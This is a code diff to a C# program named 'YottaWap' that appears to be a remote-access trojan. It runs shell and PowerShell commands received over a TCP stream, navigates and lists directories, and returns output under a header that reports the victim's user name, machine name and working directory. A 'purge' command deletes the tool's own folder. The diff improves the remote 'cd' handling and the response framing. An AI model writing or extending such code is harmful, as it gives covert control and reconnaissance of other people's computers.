@@ -1,17 +1,11 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Collections.ObjectModel;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
-using System.Management.Automation;
-using System.Management.Automation.Runspaces;
 using System.Net;
-using System.Net.Http;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Windows;
 using Emgu.CV;
 using Ionic.Zip;
@@ -274,12 +268,52 @@ namespace YottaWap
                 // p.WaitForExit();
                 // Read the output stream first and then wait.
                 string output = p.StandardOutput.ReadToEnd();
-                p.WaitForExitAsync();
+
+                p.WaitForExit();
                 return output;
             }
             catch (Exception ex)
             {
                 return ex.Message;
+            }
+        }
+        string ProcessDirectory(string dir)
+        {
+            List<string> output = new List<string>();
+            dir = dir.Replace("/", "\\");
+            dir = dir.Trim();
+            string[] parts = dir.Split("\\");
+            for (int i = parts.Length -1; i >= 0; i--)
+            {
+                if (parts[i] == "..")
+                {
+                    i -= 1;
+                    continue;
+                }
+                output.Add(parts[i]);
+            }
+            output.Reverse();
+            Debug.WriteLine(String.Join("\\", output));
+            return String.Join("\\", output);
+        }
+        string CD(string dir)
+        {
+            if (dir == "~")
+            {
+                shellWorkingDirectory = Environment.GetEnvironmentVariable("USERPROFILE");
+                return "";
+            } 
+            else
+            {
+                if (Directory.Exists(Path.Join(shellWorkingDirectory, dir)))
+                {
+                    shellWorkingDirectory = ProcessDirectory(Path.Join(shellWorkingDirectory, dir));
+                    return "";
+                } 
+                else
+                {
+                    return "Path not found";
+                }
             }
         }
         string ExecuteCommand(string command)
@@ -292,41 +326,10 @@ namespace YottaWap
                     string[] parts = command.Split(' ');
                     if (parts[0] == "cd")
                     {
-                        string moveTo = command.Substring(2).Replace("/", "\\").Trim();
-
-                        if (parts.Length == 1)
+                        if (parts.Length > 1)
                         {
-                            string? path = Environment.GetEnvironmentVariable("USERPROFILE");
-                            if (path != null)
-                            {
-                                shellWorkingDirectory = path;
-                                return "";
-                            }
-                            else
-                            {
-                                return "%USERPROFILE% variable = null";
-                            }
-
-                        } else if (!moveTo.Substring(1).StartsWith(":") && !moveTo.StartsWith("\\"))
-                        {
-                            if (shellWorkingDirectory.EndsWith("\\") && !moveTo.StartsWith("\\"))
-                            {
-                                shellWorkingDirectory += moveTo;
-                            }
-                            if (!shellWorkingDirectory.EndsWith("\\"))
-                            {
-                                shellWorkingDirectory += "\\" + moveTo;
-                            }
+                            return CD(command.Substring(3).Trim());
                         }
-                        else if (moveTo.StartsWith("\\"))
-                        {
-                            shellWorkingDirectory = "C:\\";
-                        }
-                        else
-                        {
-                            return "Invalid path: \"" + shellWorkingDirectory + moveTo + "\"";
-                        }
-                        return "";
                     } 
                     else
                     {
@@ -356,45 +359,12 @@ namespace YottaWap
                             break;
                         case "ls":
                             return string.Join("\n", Directory.GetFileSystemEntries(shellWorkingDirectory));
-                        //case "cd":
-                        //    string moveTo = command.Substring(2).Replace("/", "\\").Trim();
-
-                        //    if (parts.Length == 1)
-                        //    {
-                        //        string? path = Environment.GetEnvironmentVariable("USERPROFILE");
-                        //        if (path != null)
-                        //        {
-                        //            shellWorkingDirectory = path;
-                        //            return "";
-                        //        }
-                        //        else
-                        //        {
-                        //            return "%USERPROFILE% variable = null";
-                        //        }
-
-                        //    }
-                        //    if (!moveTo.Substring(1).StartsWith(":") && !moveTo.StartsWith("\\"))
-                        //    {
-                        //        if (shellWorkingDirectory.EndsWith("\\") && !moveTo.StartsWith("\\"))
-                        //        {
-                        //            shellWorkingDirectory += moveTo;
-                        //            break;
-                        //        }
-                        //        if (!shellWorkingDirectory.EndsWith("\\"))
-                        //        {
-                        //            shellWorkingDirectory += "\\" + moveTo;
-                        //            break;
-                        //        }
-                        //    }
-                        //    else if (moveTo.StartsWith("\\"))
-                        //    {
-                        //        shellWorkingDirectory = "C:\\";
-                        //    }
-                        //    else
-                        //    {
-                        //        return "Invalid path: \"" + shellWorkingDirectory + moveTo + "\"";
-                        //    }
-                        //    break;
+                        case "cd":
+                            if (parts.Length > 1)
+                            {
+                                return CD(command.Substring(3).Trim());
+                            }
+                            break;
                     }
                 }
             }
@@ -406,6 +376,25 @@ namespace YottaWap
             return "";
         }
 
+        void SendResponse(byte[] data, Stream stream)
+        {
+            string header = CreateHeader(data);
+            stream.Write(Encoding.UTF8.GetBytes(header), 0, header.Length);
+            stream.Write(data, 0, data.Length);
+        }
+        void SendResponse(string data, Stream stream)
+        {
+            SendResponse(Encoding.UTF8.GetBytes(data), stream);
+        }
+
+        string CreateHeader(byte[] data)
+        {
+            string UserName = Environment.UserName;
+            string machineName = Environment.MachineName;
+
+            string dataLength = data.Length.ToString();
+            return (UserName + "::" + machineName + "::" + shellWorkingDirectory + "::" + (powershellMode == true ? "1" : "0") + "::" + dataLength + "::").PadRight(135, '#');
+        }
         int EnterLoop()
         {
 
@@ -448,8 +437,7 @@ namespace YottaWap
                             {
                                 Directory.Delete(mainPath, true);
                                 sessionActive = false;
-                                byte[] sendData = Encoding.UTF8.GetBytes("Purge Successful.");
-                                stream.Write(sendData, 0, sendData.Length);
+                                SendResponse("Purge Successful.", stream);
                                 stream.Close();
                                 stream.Dispose();
                                 client.Close();
@@ -461,6 +449,7 @@ namespace YottaWap
                             if (command.Trim() == "disconnect")
                             {
                                 sessionActive = false;
+                                SendResponse("Disconnecting...", stream);
                                 stream.Close();
                                 stream.Dispose();
                                 client.Close();
@@ -480,13 +469,12 @@ namespace YottaWap
                                 }
                                 if (output != "")
                                 {
-                                    byte[] buffer = Encoding.UTF8.GetBytes(output + "\n" + prefix);
-                                    stream.Write(buffer, 0, buffer.Length);
+                                    SendResponse(output, stream);
                                 }
                                 else
                                 {
-                                    byte[] buffer = Encoding.UTF8.GetBytes(prefix);
-                                    stream.Write(buffer, 0, buffer.Length);
+                                    SendResponse("-> NULL", stream);
+                                    
                                 }
                             }
                         }
